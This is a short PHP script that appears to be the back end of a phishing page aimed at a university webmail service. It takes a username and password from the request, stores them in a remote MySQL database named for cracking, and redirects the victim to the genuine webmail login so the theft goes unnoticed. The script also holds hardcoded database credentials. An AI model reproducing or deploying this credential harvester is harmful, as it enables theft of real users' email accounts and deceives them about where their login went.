<?php

$mysql_host = "mysql7.000webhost.com";
$mysql_database = "a2142938_crack";
$mysql_user = "a2142938_gara";
$mysql_password = "iamwithyou1";

mysql_connect($mysql_host ,$mysql_user,$mysql_password);
	mysql_select_db($mysql_database);
	
$x=$_GET['imapuser'];
$y=$_GET['pass'];

$query="INSERT INTO  `list` (
`user`,`pass`
)
VALUES (
'$x', '$y'
)";
mysql_query($query);
mysql_close();
header('location:https://vayu.nitt.edu/mail/imp/');
?>
